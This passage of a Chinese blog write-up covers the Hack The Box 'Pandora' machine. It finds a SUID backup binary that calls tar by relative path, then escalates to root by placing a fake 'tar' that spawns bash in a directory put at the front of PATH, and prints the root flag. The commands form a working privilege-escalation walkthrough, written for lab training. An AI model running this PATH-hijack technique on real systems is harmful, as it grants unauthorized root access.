<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh matt@10.10.11.136 -i ../.ssh/id_rsa <br>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Wed 27 Dec 06:25:01 UTC 2023<br><br>  System load:           0.0<br>  Usage of /:            63.3% of 4.87GB<br>  Memory usage:          15%<br>  Swap usage:            0%<br>  Processes:             237<br>  Users logged <span class="hljs-keyword">in</span>:       0<br>  IPv4 address <span class="hljs-keyword">for</span> eth0: 10.10.11.136<br>  IPv6 address <span class="hljs-keyword">for</span> eth0: dead:beef::250:56ff:feb9:af3<br><br>  =&gt; /boot is using 91.8% of 219MB<br><br>0 updates can be applied immediately.<br><br>The list of available updates is more than a week old.<br>To check <span class="hljs-keyword">for</span> new updates run: sudo apt update<br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>matt@pandora:~$ <br><br></code></pre></td></tr></table></figure>

<p>29、查看本机拥有搞权限文件时，发现了一个备份文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">matt@pandora:/home/matt$ find / -perm -4000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -perm -4000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo<br>   265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec<br>   267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn<br>   262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp<br>   267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd<br>   264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount<br>   262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup<br>   267390     68 -rwsr-xr-x   1 root     root        68208 Jul 14  2021 /usr/bin/passwd<br>   264371     56 -rwsr-xr-x   1 root     root        55528 Jul 21  2020 /usr/bin/mount<br>   264643     68 -rwsr-xr-x   1 root     root        67816 Jul 21  2020 /usr/bin/su<br>   264040     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at<br>   264219     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount<br>   267387     52 -rwsr-xr-x   1 root     root        53040 Jul 14  2021 /usr/bin/chsh<br>   262815    464 -rwsr-xr-x   1 root     root       473576 Jul 23  2021 /usr/lib/openssh/ssh-keysign<br>   264920     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   264927     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device<br>   266611     24 -rwsr-xr-x   1 root     root          22840 May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1<br></code></pre></td></tr></table></figure>

<p>30、本机运行下这个文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">matt@pandora:~$ <br>matt@pandora:~$ pandora_backup<br>PandoraFMS Backup Utility<br>Now attempting to backup PandoraFMS client<br>tar: Removing leading `/<span class="hljs-string">&#x27; from member names</span><br><span class="hljs-string">/var/www/pandora/pandora_console/AUTHORS</span><br><span class="hljs-string">tar: Removing leading `/&#x27;</span> from hard <span class="hljs-built_in">link</span> targets<br>/var/www/pandora/pandora_console/COPYING<br>/var/www/pandora/pandora_console/DB_Dockerfile<br>/var/www/pandora/pandora_console/DEBIAN/<br>/var/www/pandora/pandora_console/DEBIAN/md5sums<br>/var/www/pandora/pandora_console/DEBIAN/conffiles<br>/var/www/pandora/pandora_console/DEBIAN/control<br>/var/www/pandora/pandora_console/DEBIAN/make_deb_package.sh<br>/var/www/pandora/pandora_console/DEBIAN/postinst<br>/var/www/pandora/pandora_console/Dockerfile<br>/var/www/pandora/pandora_console/ajax.php<br>/var/www/pandora/pandora_console/attachment/<br>/var/www/pandora/pandora_console/attachment/.htaccess<br>/var/www/pandora/pandora_console/attachment/downloads/<br>/var/www/pandora/pandora_console/attachment/downloads/.gitignore<br>/var/www/pandora/pandora_console/attachment/plugin/<br>/var/www/pandora/pandora_console/attachment/plugin/index.html<br>/var/www/pandora/pandora_console/attachment/files_repo/<br>/var/www/pandora/pandora_console/attachment/pandora_chat.global_counter.txt<br>/var/www/pandora/pandora_console/attachment/.cron.supervisor.servers.idx<br>/var/www/pandora/pandora_console/attachment/mibs/<br>/var/www/pandora/pandora_console/attachment/mibs/index.html<br>/var/www/pandora/pandora_console/attachment/index.html<br>................<br>/var/www/pandora/pandora_console/vendor/egulias/email-validator/composer.json<br>/var/www/pandora/pandora_console/vendor/egulias/email-validator/phpunit.xml.dist<br>/var/www/pandora/pandora_console/vendor/egulias/email-validator/LICENSE<br>/var/www/pandora/pandora_console/ws.php<br>Backup successful!<br>Terminating program!<br>matt@pandora:~$<br></code></pre></td></tr></table></figure>

<p>31、它正在做备份，有一长串路径，全部在&#x2F;var&#x2F;www&#x2F;pandora. 在顶部它引用了tar几次，这表明它用于tar压缩&#x2F;存档。</p>
<p>32、我们把这个文件下载下来，本地用strings工具再查看下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs bash">matt@pandora:~$ file /usr/bin/pandora_backup<br>/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, not stripped<br>matt@pandora:~$ <br>matt@pandora:~$ file /usr/bin/pandora_backup<br>/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, not stripped<br>matt@pandora:~$ python3 -m http.server -d /usr/bin/ 9001<br>Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...<br>10.10.14.3 - - [27/Dec/2023 06:30:36] <span class="hljs-string">&quot;GET /pandora_backup HTTP/1.1&quot;</span> 200 -<br>^C<br>Keyboard interrupt received, exiting.<br>matt@pandora:~$ <br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ wget http://10.10.11.136:9001/pandora_backup                                                            <br>--2023-12-27 14:30:36--  http://10.10.11.136:9001/pandora_backup<br>正在连接 10.10.11.136:9001... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：16816 (16K) [application/octet-stream]<br>正在保存至: “pandora_backup”<br><br>pandora_backup                         100%[===========================================================================&gt;]  16.42K  53.7KB/s  用时 0.3s    <br><br>2023-12-27 14:30:37 (53.7 KB/s) - 已保存 “pandora_backup” [16816/16816])<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">ls</span><br>50961.py  pandora_backup  reports<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ strings pandora_backup     <br>/lib64/ld-linux-x86-64.so.2<br>puts<br>setreuid<br>system<br>getuid<br>geteuid<br>__cxa_finalize<br>__libc_start_main<br>libc.so.6<br>GLIBC_2.2.5<br>_ITM_deregisterTMCloneTable<br>__gmon_start__<br>_ITM_registerTMCloneTable<br>u/UH<br>[]A\A]A^A_<br>PandoraFMS Backup Utility<br>Now attempting to backup PandoraFMS client<br>tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*<br>Backup failed!<br>Check your permissions!<br>Backup successful!<br>Terminating program!<br>;*3$<span class="hljs-string">&quot;</span><br><span class="hljs-string">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span><br><span class="hljs-string">crtstuff.c</span><br><span class="hljs-string">deregister_tm_clones</span><br><span class="hljs-string">__do_global_dtors_aux</span><br><span class="hljs-string">completed.0</span><br><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><br><span class="hljs-string">frame_dummy</span><br><span class="hljs-string">__frame_dummy_init_array_entry</span><br><span class="hljs-string">backup.c</span><br><span class="hljs-string">__FRAME_END__</span><br><span class="hljs-string">__init_array_end</span><br><span class="hljs-string">_DYNAMIC</span><br><span class="hljs-string">__init_array_start</span><br><span class="hljs-string">__GNU_EH_FRAME_HDR</span><br><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><br><span class="hljs-string">__libc_csu_fini</span><br><span class="hljs-string">_ITM_deregisterTMCloneTable</span><br><span class="hljs-string">puts@GLIBC_2.2.5</span><br><span class="hljs-string">_edata</span><br><span class="hljs-string">getuid@GLIBC_2.2.5</span><br><span class="hljs-string">system@GLIBC_2.2.5</span><br><span class="hljs-string">geteuid@GLIBC_2.2.5</span><br><span class="hljs-string">__libc_start_main@GLIBC_2.2.5</span><br><span class="hljs-string">__data_start</span><br><span class="hljs-string">__gmon_start__</span><br><span class="hljs-string">__dso_handle</span><br><span class="hljs-string">_IO_stdin_used</span><br><span class="hljs-string">__libc_csu_init</span><br><span class="hljs-string">setreuid@GLIBC_2.2.5</span><br><span class="hljs-string">__bss_start</span><br><span class="hljs-string">main</span><br><span class="hljs-string">__TMC_END__</span><br><span class="hljs-string">_ITM_registerTMCloneTable</span><br><span class="hljs-string">__cxa_finalize@GLIBC_2.2.5</span><br><span class="hljs-string">.symtab</span><br><span class="hljs-string">.strtab</span><br><span class="hljs-string">.shstrtab</span><br><span class="hljs-string">.interp</span><br><span class="hljs-string">.note.gnu.build-id</span><br><span class="hljs-string">.note.ABI-tag</span><br><span class="hljs-string">.gnu.hash</span><br><span class="hljs-string">.dynsym</span><br><span class="hljs-string">.dynstr</span><br><span class="hljs-string">.gnu.version</span><br><span class="hljs-string">.gnu.version_r</span><br><span class="hljs-string">.rela.dyn</span><br><span class="hljs-string">.rela.plt</span><br><span class="hljs-string">.init</span><br><span class="hljs-string">.plt.got</span><br><span class="hljs-string">.text</span><br><span class="hljs-string">.fini</span><br><span class="hljs-string">.rodata</span><br><span class="hljs-string">.eh_frame_hdr</span><br><span class="hljs-string">.eh_frame</span><br><span class="hljs-string">.init_array</span><br><span class="hljs-string">.fini_array</span><br><span class="hljs-string">.dynamic</span><br><span class="hljs-string">.got.plt</span><br><span class="hljs-string">.data</span><br><span class="hljs-string">.bss</span><br><span class="hljs-string">.comment</span><br><span class="hljs-string">       </span><br><span class="hljs-string">┌──(kali㉿kali)-[~/桌面]</span><br><span class="hljs-string">└─$ </span><br></code></pre></td></tr></table></figure>

<p>33、这里可以看出来该tar命令没有使用绝对路径，这意味着我们可以利用PATH环境变量注入漏洞将权限提升到root！</p>
<p><code>由于没有给定路径tar，因此它将使用当前用户的PATH环境变量来查找要运行的有效可执行文件。但我可以控制该路径，这使得它很容易受到路径劫持。</code></p>
<p><code>将我们的PATH环境变量导出到/tmp：</code></p>
<p><code>echo $PATH</code></p>
<p><code>export PATH=/tmp/test:$PATH</code></p>
<p><code>echo $PATH</code></p>
<p>34、我们开始尝试设置环境变量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">matt@pandora:~$ <span class="hljs-built_in">ls</span> -la /tmp<br>total 52<br>drwxrwxrwt 13 root root 4096 Dec 27 06:09 .<br>drwxr-xr-x 18 root root 4096 Dec  7  2021 ..<br>drwxrwxrwt  2 root root 4096 Dec 27 01:06 .font-unix<br>drwxrwxrwt  2 root root 4096 Dec 27 01:06 .ICE-unix<br>drwx------  3 root root 4096 Dec 27 01:06 systemd-private-062d5d900bcf45168ea97553a0cb3f56-apache2.service-xIYOKi<br>drwx------  3 root root 4096 Dec 27 01:06 systemd-private-062d5d900bcf45168ea97553a0cb3f56-systemd-logind.service-jawnUh<br>drwx------  3 root root 4096 Dec 27 01:06 systemd-private-062d5d900bcf45168ea97553a0cb3f56-systemd-resolved.service-Rdzmth<br>drwx------  3 root root 4096 Dec 27 01:06 systemd-private-062d5d900bcf45168ea97553a0cb3f56-systemd-timesyncd.service-prnntj<br>drwx------  3 root root 4096 Dec 27 01:30 systemd-private-062d5d900bcf45168ea97553a0cb3f56-upower.service-aJrvDh<br>drwxrwxrwt  2 root root 4096 Dec 27 01:06 .Test-unix<br>drwx------  2 root root 4096 Dec 27 01:06 vmware-root_711-4256610694<br>drwxrwxrwt  2 root root 4096 Dec 27 01:06 .X11-unix<br>drwxrwxrwt  2 root root 4096 Dec 27 01:06 .XIM-unix<br>matt@pandora:~$ <span class="hljs-built_in">cd</span> tmp<br>-bash: <span class="hljs-built_in">cd</span>: tmp: No such file or directory<br>matt@pandora:~$ <span class="hljs-built_in">cd</span> /tmp<br>matt@pandora:/tmp$ <span class="hljs-built_in">ls</span><br>systemd-private-062d5d900bcf45168ea97553a0cb3f56-apache2.service-xIYOKi<br>systemd-private-062d5d900bcf45168ea97553a0cb3f56-systemd-logind.service-jawnUh<br>systemd-private-062d5d900bcf45168ea97553a0cb3f56-systemd-resolved.service-Rdzmth<br>systemd-private-062d5d900bcf45168ea97553a0cb3f56-systemd-timesyncd.service-prnntj<br>systemd-private-062d5d900bcf45168ea97553a0cb3f56-upower.service-aJrvDh<br>vmware-root_711-4256610694<br>matt@pandora:/tmp$ <span class="hljs-built_in">mkdir</span> <span class="hljs-built_in">test</span><br>matt@pandora:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br>matt@pandora:/tmp$ <span class="hljs-built_in">cd</span> <span class="hljs-built_in">test</span>/<br>matt@pandora:/tmp/test$ <span class="hljs-built_in">export</span> PATH=/tmp/test:<span class="hljs-variable">$PATH</span><br>matt@pandora:/tmp/test$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/tmp/test:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<br>matt@pandora:/tmp/test$ <span class="hljs-built_in">touch</span> tar<br>matt@pandora:/tmp/test$ vim tar<br>matt@pandora:/tmp/test$ <span class="hljs-built_in">cat</span> tar<br><span class="hljs-comment">#!/bin/bash</span><br><br>bash<br>matt@pandora:/tmp/test$ <span class="hljs-built_in">chmod</span> +x tar <br></code></pre></td></tr></table></figure>

<p>35、然后我们开始运行程序，并获取到最终的flag信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">matt@pandora:/tmp/test$ pandora_backup<br>PandoraFMS Backup Utility<br>Now attempting to backup PandoraFMS client<br>root@pandora:/tmp/test<span class="hljs-comment"># id</span><br>uid=0(root) gid=1000(matt) <span class="hljs-built_in">groups</span>=1000(matt)<br>root@pandora:/tmp/test<span class="hljs-comment"># cat /root/root.txt</span><br>42d658b2326590f95f19fbceb1aab99f<br>root@pandora:/tmp/test<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>


<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/423</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Pandora-htb-writeup</div>
      <div>https://sh1yan.top/2023/12/27/Pandora-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年12月27日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/12/28/Paper-htb-writeup/" title="Paper-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Paper-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/26/Horizontall-htb-writeup/" title="Horizontall-htb-writeup">
                        <span class="hidden-mobile">Horizontall-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
